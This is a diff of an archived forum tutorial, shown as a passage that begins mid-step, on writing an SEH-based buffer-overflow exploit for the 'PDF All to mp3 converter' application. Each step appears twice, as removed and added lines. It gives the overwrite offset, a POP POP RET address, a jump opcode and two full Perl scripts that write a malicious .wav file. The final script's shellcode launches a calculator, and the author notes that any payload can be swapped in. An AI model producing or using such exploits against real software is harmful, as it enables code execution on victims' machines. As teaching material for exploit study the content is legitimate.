-8)    I will use the last address 0x005d6a91 (address of pop pop ret instruction)Ö.now the modified script is shown below, now if the exploit works the application should pause at the break instruction (\xcc\xcc\xcc\xcc). If this works then we will replace the shellcode with real shellcode.<br />
-<br />
-The perl script looks like this<br />
-<br />
+</div>2)    After running the script ‚Äúexploit_seh.wav‚Äù file is created, now attach the debugger to the process and after opening the exploit_seh.wav file with ‚ÄúPDF All to mp3 converter‚Äù we find that seh handler contains the pattern 39684638, because of the little endian format you will have to read it as 38 46 68 39 which stands for 8Fh9<br/>
+<br/>
+<a href="../external.html?link=http://imageshack.us/photo/my-images/707/sehandleroverwrite9.png/" target="_blank"><img alt="" border="0" src="../external.html?link=http://imageshack.com/e/p5aMES7Yj"/></a><br/>
+<br/>
+Uploaded with <a href="../external.html?link=http://imageshack.us/" target="_blank">ImageShack.us</a><br/>
+<br/>
+<a href="../external.html?link=http://imageshack.us/photo/my-images/89/sehandleroverwrite10.png/" target="_blank"><img alt="" border="0" src="../external.html?link=http://imageshack.com/e/p5aMES7Yj"/></a><br/>
+<br/>
+Uploaded with <a href="../external.html?link=http://imageshack.us/" target="_blank">ImageShack.us</a><br/>
+<br/>
+3)    Now let us give this value to the pattern_offset.rb (ruby script in metasploit), after giving this value to the metasploit i found that the offset to the seh handler is 4136, which means the offset of the pointer to the next seh record is 4136-4 = 4132<br/>
+<br/>
+<a href="../external.html?link=http://imageshack.us/photo/my-images/153/offset11.png/" target="_blank"><img alt="" border="0" src="../external.html?link=http://imageshack.com/e/p5aMES7Yj"/></a><br/>
+<br/>
+Uploaded with <a href="../external.html?link=http://imageshack.us/" target="_blank">ImageShack.us</a><br/>
+<br/>
+4)    Now let us modify our script to contain 4132 A‚Äôs followed by break (‚Äú\xcc\xcc\xcc\xcc‚Äù) instruction then seh handler would contain address of pop pop ret instruction and then a pattern (this will be replaced with our shellcode). <br/>
+<br/>
+If everything works well the application should run and when the exception occurs, the control is passed to the seh handler (which executes POP POP RET instruction, which removes first 8 bytes from the stack and puts the next 4 bytes into EIP, which is the address of the pointer to the next seh record ) because of this the instruction at the pointer to the next seh record is executed (which is the break instruction), so if the exploit succeeds the application should pause at break instruction (‚Äú\xcc\xcc\xcc\xcc‚Äù)<br/>
+<b><u><br/>
+Finding the address of POP POP RET</u></b><br/>
+<br/>
+5)     Before we modify the script, Lets us find the address of pop pop ret in the application dll and also we should make sure that the dll doesn‚Äôt use the safeseh protection (i.e compiled with safeseh)‚Ä¶to find the application dll‚Äôs that are not safeseh compiled, we can use a immunity debugger plugin called pvefindaddr, this plugin will display the dll‚Äôs which are not safeseh complied (displayed in red) and then we can use the address of POP POP RET instruction from the non safeseh compiled Dll or EXE. The below figure shows pvefindaddr plugin showing the non safeseh dll‚Äôs and EXE‚Äôs in red.<br/>
+<br/>
+<a href="../external.html?link=http://imageshack.us/photo/my-images/545/poppopret12.png/" target="_blank"><img alt="" border="0" src="../external.html?link=http://imageshack.com/e/p5aMES7Yj"/></a><br/>
+<br/>
+Uploaded with <a href="../external.html?link=http://imageshack.us/" target="_blank">ImageShack.us</a><br/>
+<br/>
+6)    From the above figure we see that there are 4 application dll‚Äôs and EXE‚Äôs which are not compiled with safeseh protection (shown in red in the above figure)....i have chosen the application EXE ‚ÄúAlltomp3.exe‚Äù to find the address of POP POP RET.<br/>
+<br/>
+7)    To find the address of POP POP RET from the EXE, we can use another ruby script in metasploit (msfpescan) as shown below.<br/>
+<br/>
+<a href="../external.html?link=http://imageshack.us/photo/my-images/571/poppopret13.png/" target="_blank"><img alt="" border="0" src="../external.html?link=http://imageshack.com/e/p5aMES7Yj"/></a><br/>
+<br/>
+Uploaded with <a href="../external.html?link=http://imageshack.us/" target="_blank">ImageShack.us</a><br/>
+<br/>
+8)    I will use the last address 0x005d6a91 (address of pop pop ret instruction)‚Ä¶.now the modified script is shown below, now if the exploit works the application should pause at the break instruction (\xcc\xcc\xcc\xcc). If this works then we will replace the shellcode with real shellcode.<br/>
+<br/>
+The perl script looks like this<br/>
+<br/>
 <div class="bbcode_container">
 	<div class="bbcode_description">Code:</div>
-	<pre class="bbcode_code"style="height:180px;">#!/usr/bin/perl -w
+	<pre class="bbcode_code" style="height:180px;">#!/usr/bin/perl -w
 use strict;
 
 
-my $file = &quot;exploit_seh.wav&quot;;
-my $junk = &quot;\x41&quot; x 4132;   # 4132 Aís
-my $nseh = &quot;\xcc\xcc\xcc\xcc&quot;;  #break
-my $seh = pack(&quot;V&quot;, 0x005d6a91); #address of pop pop ret 
-my $shellcode = &quot;1ABCDEFGHIJKLMNOPQRSTUV2ABCDEFGHIJKLMNOPQRSTUV3ABCDEFGHIJKLMNOPQRSTUV4ABCDEFGHIJKLMNOPQRSTUV5ABCDEFGHIJKLMNOPQRSTUV&quot;;
+my $file = "exploit_seh.wav";
+my $junk = "\x41" x 4132;   # 4132 A‚Äôs
+my $nseh = "\xcc\xcc\xcc\xcc";  #break
+my $seh = pack("V", 0x005d6a91); #address of pop pop ret 
+my $shellcode = "1ABCDEFGHIJKLMNOPQRSTUV2ABCDEFGHIJKLMNOPQRSTUV3ABCDEFGHIJKLMNOPQRSTUV4ABCDEFGHIJKLMNOPQRSTUV5ABCDEFGHIJKLMNOPQRSTUV";
 
 
-open OUTPUT, &quot;&gt;&quot;, &quot;$file&quot;;
+open OUTPUT, "&gt;", "$file";
 print OUTPUT $junk.$nseh.$seh.$shellcode;</pre>
-</div>9)    Now I open the Alltomp3.exe using immunity debugger and run it and then open the file ìexploit_seh.wavî created from the above script, now the exception occurs as shown in the figure below (left bottom corner)<br />
-<br />
-<a href="../external.html?link=http://imageshack.us/photo/my-images/231/debuggersehoverwrite14.png/" target="_blank"><img src="../external.html?link=http://imageshack.com/e/p5aMES7Yj" border="0" alt="" /></a><br />
-<br />
-Uploaded with <a href="../external.html?link=http://imageshack.us/" target="_blank">ImageShack.us</a><br />
-<br />
-After pressing shift+F9, the exception is passed to exception handler you will see that the application breaks at \XCC as expectedÖand also in the memory dump (lower left pane) you will see our shellcode (which is at plus 6 bytes)Ö.it looks like everything is working fine.<br />
-<br />
-<a href="../external.html?link=http://imageshack.us/photo/my-images/199/debuggerseh15.png/" target="_blank"><img src="../external.html?link=http://imageshack.com/e/p5aMES7Yj" border="0" alt="" /></a><br />
-<br />
-Uploaded with <a href="../external.html?link=http://imageshack.us/" target="_blank">ImageShack.us</a><br />
-<br />
-10)    Now since our shellcode is at plus 6 bytes, instead of break instruction (\xcc\xcc\xcc\xcc) we will use jmp + 6 bytes, so when the application runs it will jump to our shellcode and execute it, the opcode for jmp + 6 bytes is (\xeb\x06\x90\x90) and we will also replace our shellcode with real shellcode (shellcode to pop a calculator)Ö.The modified script looks like this.<br />
-If everthing works well, it should pop a calculator<br />
-<br />
+</div>9)    Now I open the Alltomp3.exe using immunity debugger and run it and then open the file ‚Äúexploit_seh.wav‚Äù created from the above script, now the exception occurs as shown in the figure below (left bottom corner)<br/>
+<br/>
+<a href="../external.html?link=http://imageshack.us/photo/my-images/231/debuggersehoverwrite14.png/" target="_blank"><img alt="" border="0" src="../external.html?link=http://imageshack.com/e/p5aMES7Yj"/></a><br/>
+<br/>
+Uploaded with <a href="../external.html?link=http://imageshack.us/" target="_blank">ImageShack.us</a><br/>
+<br/>
+After pressing shift+F9, the exception is passed to exception handler you will see that the application breaks at \XCC as expected‚Ä¶and also in the memory dump (lower left pane) you will see our shellcode (which is at plus 6 bytes)‚Ä¶.it looks like everything is working fine.<br/>
+<br/>
+<a href="../external.html?link=http://imageshack.us/photo/my-images/199/debuggerseh15.png/" target="_blank"><img alt="" border="0" src="../external.html?link=http://imageshack.com/e/p5aMES7Yj"/></a><br/>
+<br/>
+Uploaded with <a href="../external.html?link=http://imageshack.us/" target="_blank">ImageShack.us</a><br/>
+<br/>
+10)    Now since our shellcode is at plus 6 bytes, instead of break instruction (\xcc\xcc\xcc\xcc) we will use jmp + 6 bytes, so when the application runs it will jump to our shellcode and execute it, the opcode for jmp + 6 bytes is (\xeb\x06\x90\x90) and we will also replace our shellcode with real shellcode (shellcode to pop a calculator)‚Ä¶.The modified script looks like this.<br/>
+If everthing works well, it should pop a calculator<br/>
+<br/>
 <div class="bbcode_container">
 	<div class="bbcode_description">Code:</div>
-	<pre class="bbcode_code"style="height:372px;">   my $file = &quot;exploit_seh.wav&quot;;
-   my $junk =&quot;\x41&quot; x 4132 ;
-   my $nseh = &quot;\xeb\x06\x90\x90&quot;;
-   my $seh = pack(&quot;V&quot;, 0x005d6a91);
-   my $shellcode = &quot;\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff\x4f\x49\x49\x49\x49\x49&quot;.
-&quot;\x49\x51\x5a\x56\x54\x58\x36\x33\x30\x56\x58\x34\x41\x30\x42\x36&quot;.
-&quot;\x48\x48\x30\x42\x33\x30\x42\x43\x56\x58\x32\x42\x44\x42\x48\x34&quot;.
-&quot;\x41\x32\x41\x44\x30\x41\x44\x54\x42\x44\x51\x42\x30\x41\x44\x41&quot;.
-&quot;\x56\x58\x34\x5a\x38\x42\x44\x4a\x4f\x4d\x4e\x4f\x4a\x4e\x46\x44&quot;.
-&quot;\x42\x30\x42\x50\x42\x30\x4b\x38\x45\x54\x4e\x33\x4b\x58\x4e\x37&quot;.
-&quot;\x45\x50\x4a\x47\x41\x30\x4f\x4e\x4b\x38\x4f\x44\x4a\x41\x4b\x48&quot;.
-&quot;\x4f\x35\x42\x32\x41\x50\x4b\x4e\x49\x34\x4b\x38\x46\x43\x4b\x48&quot;.
-&quot;\x41\x30\x50\x4e\x41\x43\x42\x4c\x49\x39\x4e\x4a\x46\x48\x42\x4c&quot;.
-&quot;\x46\x37\x47\x50\x41\x4c\x4c\x4c\x4d\x50\x41\x30\x44\x4c\x4b\x4e&quot;.
-&quot;\x46\x4f\x4b\x43\x46\x35\x46\x42\x46\x30\x45\x47\x45\x4e\x4b\x48&quot;.
-&quot;\x4f\x35\x46\x42\x41\x50\x4b\x4e\x48\x46\x4b\x58\x4e\x30\x4b\x54&quot;.
-&quot;\x4b\x58\x4f\x55\x4e\x31\x41\x50\x4b\x4e\x4b\x58\x4e\x31\x4b\x48&quot;.
-&quot;\x41\x30\x4b\x4e\x49\x38\x4e\x45\x46\x52\x46\x30\x43\x4c\x41\x43&quot;.
-&quot;\x42\x4c\x46\x46\x4b\x48\x42\x54\x42\x53\x45\x38\x42\x4c\x4a\x57&quot;.
-&quot;\x4e\x30\x4b\x48\x42\x54\x4e\x30\x4b\x48\x42\x37\x4e\x51\x4d\x4a&quot;.
-&quot;\x4b\x58\x4a\x56\x4a\x50\x4b\x4e\x49\x30\x4b\x38\x42\x38\x42\x4b&quot;.
-&quot;\x42\x50\x42\x30\x42\x50\x4b\x58\x4a\x46\x4e\x43\x4f\x35\x41\x53&quot;.
-&quot;\x48\x4f\x42\x56\x48\x45\x49\x38\x4a\x4f\x43\x48\x42\x4c\x4b\x37&quot;.
-&quot;\x42\x35\x4a\x46\x42\x4f\x4c\x48\x46\x50\x4f\x45\x4a\x46\x4a\x49&quot;.
-&quot;\x50\x4f\x4c\x58\x50\x30\x47\x45\x4f\x4f\x47\x4e\x43\x36\x41\x46&quot;.
-&quot;\x4e\x36\x43\x46\x42\x50\x5a&quot;;
+	<pre class="bbcode_code" style="height:372px;">   my $file = "exploit_seh.wav";
+   my $junk ="\x41" x 4132 ;
+   my $nseh = "\xeb\x06\x90\x90";
+   my $seh = pack("V", 0x005d6a91);
+   my $shellcode = "\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff\x4f\x49\x49\x49\x49\x49".
+"\x49\x51\x5a\x56\x54\x58\x36\x33\x30\x56\x58\x34\x41\x30\x42\x36".
+"\x48\x48\x30\x42\x33\x30\x42\x43\x56\x58\x32\x42\x44\x42\x48\x34".
+"\x41\x32\x41\x44\x30\x41\x44\x54\x42\x44\x51\x42\x30\x41\x44\x41".
+"\x56\x58\x34\x5a\x38\x42\x44\x4a\x4f\x4d\x4e\x4f\x4a\x4e\x46\x44".
+"\x42\x30\x42\x50\x42\x30\x4b\x38\x45\x54\x4e\x33\x4b\x58\x4e\x37".
+"\x45\x50\x4a\x47\x41\x30\x4f\x4e\x4b\x38\x4f\x44\x4a\x41\x4b\x48".
+"\x4f\x35\x42\x32\x41\x50\x4b\x4e\x49\x34\x4b\x38\x46\x43\x4b\x48".
+"\x41\x30\x50\x4e\x41\x43\x42\x4c\x49\x39\x4e\x4a\x46\x48\x42\x4c".
+"\x46\x37\x47\x50\x41\x4c\x4c\x4c\x4d\x50\x41\x30\x44\x4c\x4b\x4e".
+"\x46\x4f\x4b\x43\x46\x35\x46\x42\x46\x30\x45\x47\x45\x4e\x4b\x48".
+"\x4f\x35\x46\x42\x41\x50\x4b\x4e\x48\x46\x4b\x58\x4e\x30\x4b\x54".
+"\x4b\x58\x4f\x55\x4e\x31\x41\x50\x4b\x4e\x4b\x58\x4e\x31\x4b\x48".
+"\x41\x30\x4b\x4e\x49\x38\x4e\x45\x46\x52\x46\x30\x43\x4c\x41\x43".
+"\x42\x4c\x46\x46\x4b\x48\x42\x54\x42\x53\x45\x38\x42\x4c\x4a\x57".
+"\x4e\x30\x4b\x48\x42\x54\x4e\x30\x4b\x48\x42\x37\x4e\x51\x4d\x4a".
+"\x4b\x58\x4a\x56\x4a\x50\x4b\x4e\x49\x30\x4b\x38\x42\x38\x42\x4b".
+"\x42\x50\x42\x30\x42\x50\x4b\x58\x4a\x46\x4e\x43\x4f\x35\x41\x53".
+"\x48\x4f\x42\x56\x48\x45\x49\x38\x4a\x4f\x43\x48\x42\x4c\x4b\x37".
+"\x42\x35\x4a\x46\x42\x4f\x4c\x48\x46\x50\x4f\x45\x4a\x46\x4a\x49".
+"\x50\x4f\x4c\x58\x50\x30\x47\x45\x4f\x4f\x47\x4e\x43\x36\x41\x46".
+"\x4e\x36\x43\x46\x42\x50\x5a";
 
-open OUTPUT, &quot;&gt;&quot;, &quot;$file&quot;;
+open OUTPUT, "&gt;", "$file";
 
 print OUTPUT $junk.$nseh.$seh.$shellcode;</pre>
-</div>11)     After running the script ìexploit_seh.wavî file is created and after opening the file with the PDF All to mp3 converter, the calculator application is run as shown below.<br />
-<br />
-<a href="../external.html?link=http://imageshack.us/photo/my-images/824/calc17.png/" target="_blank"><img src="../external.html?link=http://imageshack.com/e/p5aMES7Yj" border="0" alt="" /></a><br />
-<br />
-Uploaded with <a href="../external.html?link=http://imageshack.us/" target="_blank">ImageShack.us</a><br />
-<br />
-Now we have a working SEH based exploit (you can replace the shellcode to pop calculator with the shellcode to do anything that you want the application to do)<br />
-<br />
-<br />
-<b><u>Summary</u></b><br />
-<br />
-Hopefully this post will provide you with a basic understanding of SEH overflow vulnerability and exploit development<br />
-<br />
-<b><u>References</u></b><br />
-<br />
+</div>11)     After running the script ‚Äúexploit_seh.wav‚Äù file is created and after opening the file with the PDF All to mp3 converter, the calculator application is run as shown below.<br/>
+<br/>
+<a href="../external.html?link=http://imageshack.us/photo/my-images/824/calc17.png/" target="_blank"><img alt="" border="0" src="../external.html?link=http://imageshack.com/e/p5aMES7Yj"/></a><br/>
+<br/>
+Uploaded with <a href="../external.html?link=http://imageshack.us/" target="_blank">ImageShack.us</a><br/>
+<br/>
+Now we have a working SEH based exploit (you can replace the shellcode to pop calculator with the shellcode to do anything that you want the application to do)<br/>
+<br/>
+<br/>
+<b><u>Summary</u></b><br/>
+<br/>
+Hopefully this post will provide you with a basic understanding of SEH overflow vulnerability and exploit development<br/>
+<br/>
+<b><u>References</u></b><br/>
+<br/>
 <a href="../external.html?link=https://www.corelan.be/index.php/category/security/exploit-writing-tutorials/" target="_blank">https://www.corelan.be/index.php/cat...ing-tutorials/</a></div>
 
 	
 
 	
-		<script type="text/javascript" src="clientscript/vbulletin_lightbox6719.html?v=421"></script>
+		<script src="clientscript/vbulletin_lightbox6719.html?v=421" type="text/javascript"></script>
 		<script type="text/javascript">
 		<!--
 		vBulletin.register_control("vB_Lightbox_Container", "article_content", 1);
@@ -857,12 +850,12 @@ Hopefully this post will provide you with a basic understanding of SEH overflow 
 	vbphrase['comment'] = "Comment";
 	vbphrase['comments'] = "Comments";
 </script>
-<div id="comments" class="cms_comments_page">
+<div class="cms_comments_page" id="comments">
 	<a name="comments_start"></a>
 	
-	<script type="text/javascript" src="clientscript/vbulletin-editor6719.html?v=421"></script>
-	<script type="text/javascript" src="clientscript/vbulletin_quick_edit6719.html?v=421"></script>
-	<script type="text/javascript" src="clientscript/vbulletin_post_loader6719.html?v=421"></script>
+	<script src="clientscript/vbulletin-editor6719.html?v=421" type="text/javascript"></script>
+	<script src="clientscript/vbulletin_quick_edit6719.html?v=421" type="text/javascript"></script>
+	<script src="clientscript/vbulletin_post_loader6719.html?v=421" type="text/javascript"></script>
 	<div id="node_comments_hide"></div>
 	<!-- EDITOR IS BREAKING THE PAGE -->
 	
@@ -880,19 +873,19 @@ Hopefully this post will provide you with a basic understanding of SEH overflow 
 <li><div class="cms_widget">
 	<div class="block">
 		<div class="cms_widget_header">
-		<h3><img src="images/site_icons/html.html" alt="" /> G4H Facebook</h3>
+		<h3><img alt="" src="images/site_icons/html.png"/> G4H Facebook</h3>
 		</div>
 		<div class="cms_widget_content widget_content">
-		<div class="fb-like-box" data-href="https://www.facebook.com/pages/Garage4Hackers/138904662794635" data-width="300" data-height="250" data-colorscheme="light" data-show-faces="true" data-header="true" data-stream="false" data-show-border="true"></div>
+		<div class="fb-like-box" data-colorscheme="light" data-header="true" data-height="250" data-href="https://www.facebook.com/pages/Garage4Hackers/138904662794635" data-show-border="true" data-show-faces="true" data-stream="false" data-width="300"></div>
 		</div>
 	</div>
 </div></li><li><div class="cms_widget">
 	<div class="block">
 		<div class="cms_widget_header">
-		<h3><img src="images/site_icons/html.html" alt="" /> G4H Twitter</h3>
+		<h3><img alt="" src="images/site_icons/html.png"/> G4H Twitter</h3>
 		</div>
 		<div class="cms_widget_content widget_content">
-		<a class="twitter-timeline"  href="../external.html?link=https://twitter.com/garage4hackers"  data-widget-id="387207513831010305">Tweets by @garage4hackers</a>
+		<a class="twitter-timeline" data-widget-id="387207513831010305" href="../external.html?link=https://twitter.com/garage4hackers">Tweets by @garage4hackers</a>
 <script>!function(d,s,id){var js,fjs=d.getElementsByTagName(s)[0],p=/^http:/.test(d.location)?'http':'https';if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src=p+"://platform.twitter.com/widgets.js";fjs.parentNode.insertBefore(js,fjs);}}(document,"script","twitter-wjs");</script>
 		</div>
 	</div>
@@ -923,8 +916,7 @@ google_color_url = "";
 google_ui_features = "rc:6";
 //-->
 </script>
-<script type="text/javascript"
-  src="../pagead2.googlesyndication.com/pagead/show_ads.js">
+<script src="../pagead2.googlesyndication.com/pagead/show_ads.js" type="text/javascript">
 </script>
 </div>
 
@@ -937,24 +929,23 @@ google_ad_width = 728;
 google_ad_height = 90;
 //-->
 </script>
-<script type="text/javascript"
-src="../pagead2.googlesyndication.com/pagead/show_ads.js">
+<script src="../pagead2.googlesyndication.com/pagead/show_ads.js" type="text/javascript">
 </script></div>
 </div>
 
-<div id="footer" class="floatcontainer footer">
+<div class="floatcontainer footer" id="footer">
 
-	<form action="../external.html?link=http://garage4hackers.com/forum.php" method="get" id="footer_select" class="footer_select">
+	<form action="../external.html?link=http://garage4hackers.com/forum.php" class="footer_select" id="footer_select" method="get">
 
 		
 			<select name="styleid" onchange="switch_id(this, 'style')">
 				<optgroup label="Quick Style Chooser"><option class="hidden"></option></optgroup>
 				
 					
-					<optgroup label="&nbsp;Standard Styles">
+					<optgroup label="¬†Standard Styles">
 									
 					
-	<option value="1" class="" selected="selected">-- Default Style</option>
+	<option class="" selected="selected" value="1">-- Default Style</option>
 
 					
 					</optgroup>
@@ -962,10 +953,10 @@ src="../pagead2.googlesyndication.com/pagead/show_ads.js">
 				
 				
 					
-					<optgroup label="&nbsp;Mobile Styles">
+					<optgroup label="¬†Mobile Styles">
 					
 					
-	<option value="2" class="" >-- Default Mobile Style</option>
+	<option class="" value="2">-- Default Mobile Style</option>
 
 					
 					</optgroup>
@@ -977,8 +968,8 @@ src="../pagead2.googlesyndication.com/pagead/show_ads.js">
 		
 	</form>
 
-	<ul id="footer_links" class="footer_links">
-		<li><a href="sendmessage.html" rel="nofollow" accesskey="9">Contact Us</a></li>
+	<ul class="footer_links" id="footer_links">
+		<li><a accesskey="9" href="sendmessage.html" rel="nofollow">Contact Us</a></li>
 		<li><a href="index.html">Garage4hackers</a></li>
 		
 		
@@ -1004,16 +995,16 @@ src="../pagead2.googlesyndication.com/pagead/show_ads.js">
 </div> <!-- closing div for body_wrapper -->
 
 <div class="below_body">
-<div id="footer_time" class="shade footer_time">All times are GMT +5.5. The time now is <span class="time">03:54 PM</span>.</div>
+<div class="shade footer_time" id="footer_time">All times are GMT +5.5. The time now is <span class="time">03:54 PM</span>.</div>
 
-<div id="footer_copyright" class="shade footer_copyright">
+<div class="shade footer_copyright" id="footer_copyright">
 	<!-- Do not remove this copyright notice -->
-	Powered by <a href="../external.html?link=https://www.vbulletin.com/" id="vbulletinlink">vBulletin&reg;</a> Version 4.2.1 <br />Copyright &copy; 2020 vBulletin Solutions, Inc. All rights reserved. 
+	Powered by <a href="../external.html?link=https://www.vbulletin.com/" id="vbulletinlink">vBulletin¬Æ</a> Version 4.2.1 <br/>Copyright ¬© 2020 vBulletin Solutions, Inc. All rights reserved. 
 	<!-- Do not remove this copyright notice -->	
 </div>
-<div id="footer_morecopyright" class="shade footer_morecopyright">
+<div class="shade footer_morecopyright" id="footer_morecopyright">
 	<!-- Do not remove cronimage or your scheduled tasks will cease to function -->
-	<img src="cron6ed2.gif?rand=1584872668" alt="" width="1" height="1" border="0" />
+	<img alt="" border="0" height="1" src="cron6ed2.gif?rand=1584872668" width="1"/>
 	<!-- Do not remove cronimage or your scheduled tasks will cease to function -->
 	Copyright 2010 - 2017, Garage4Hackers
 	
@@ -1021,7 +1012,7 @@ src="../pagead2.googlesyndication.com/pagead/show_ads.js">
  
 
 	<div id="fb-root"></div>
-<script type="text/javascript" src="clientscript/vbulletin_facebook6719.js?v=421"></script>
+<script src="clientscript/vbulletin_facebook6719.js?v=421" type="text/javascript"></script>
 
 <script type="text/javascript">
 <!--
@@ -1054,5 +1045,5 @@ try{
 var pageTracker = _gat._getTracker('UA-17311051-3');
 pageTracker._trackPageview();
 } catch(err) {}</script>
-</body>
-</html>
+
+</div></body></html>
